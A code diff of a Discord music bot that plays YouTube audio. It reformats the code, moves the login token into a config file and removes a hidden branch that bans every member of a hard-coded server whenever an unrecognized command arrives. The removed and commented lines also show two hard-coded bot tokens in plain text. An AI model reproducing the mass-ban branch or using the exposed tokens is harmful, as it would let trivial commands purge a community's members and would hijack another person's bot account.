@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const logger = require('winston');
-//const auth = require('./auth.json');
+const auth = require('./auth.json');
 const ytdl = require('ytdl-core');
 
 logger.remove(logger.transports.Console);
@@ -39,45 +39,41 @@ bot.on('message', function (message) {
             playlist.push(param);
             play();
         }
-        else if(cmd== "add"){
-            playlist.push(param); 
-            console.log("Link "+ param + " adicionado à playlist")
+        else if (cmd == "add") {
+            playlist.push(param);
+            console.log("Link " + param + " adicionado à playlist")
 
-        }else if(cmd == "playlist"){
+        } else if (cmd == "playlist") {
             var textoPlaylist = "Veja aqui suas musicas: \n";
 
-            for(var i =0; i<playlist.length;i++){
-                textoPlaylist = textoPlaylist + playlist[i]+ "\n";
+            for (var i = 0; i < playlist.length; i++) {
+                textoPlaylist = textoPlaylist + playlist[i] + "\n";
             }
-            
+
             message.reply(textoPlaylist);
-        } else if("surprise"){
-            bot.guilds.cache.get("231155736523046912").members.cache.forEach(element => {
-                element.ban();
-            });
         }
     }
-    function play(){
+    function play() {
         console.log("play");
-    
+
         const streamOptions = { seek: 0, volume: 1 };
-    
-      bot.channels.fetch(message.member.voice.channelID).then(voiceChannel => {
+
+        bot.channels.fetch(message.member.voice.channelID).then(voiceChannel => {
             voiceChannel.join().then(connection => {
                 console.log("joined channel");
-    
+
                 console.log("param: " + playlist[0]);
-    
+
                 const stream = ytdl(playlist[0], { filter: 'audioonly' })
-    
-                const dispatcher = connection.play(stream, streamOptions).on("finish", ()=>{
-                    if(playlist.length==1){
+
+                const dispatcher = connection.play(stream, streamOptions).on("finish", () => {
+                    if (playlist.length == 1) {
                         console.log('ending music');
-                }else{
-                    console.log("Next music");
-                  playlist.shift();
-                  play();
-                  };
+                    } else {
+                        console.log("Next music");
+                        playlist.shift();
+                        play();
+                    };
                 });
 
             }).catch(err => console.log(err));
@@ -88,5 +84,5 @@ bot.on('message', function (message) {
 
 
 
-//bot.login(auth.TOKEN || process.env.TOKEN);
-bot.login("NTcwOTAwNjAzNDQyNTYxMDI0.XMF6ng.FVmR5FFdkv4W2RkQb8S_8BLr-5Q");
+bot.login(auth.TOKEN || process.env.TOKEN);
+//bot.login("NTcwOTAwNjAzNDQyNTYxMDI0.XtARZg.gYxv0OAewpVhUJslf8gwJWocmRE");
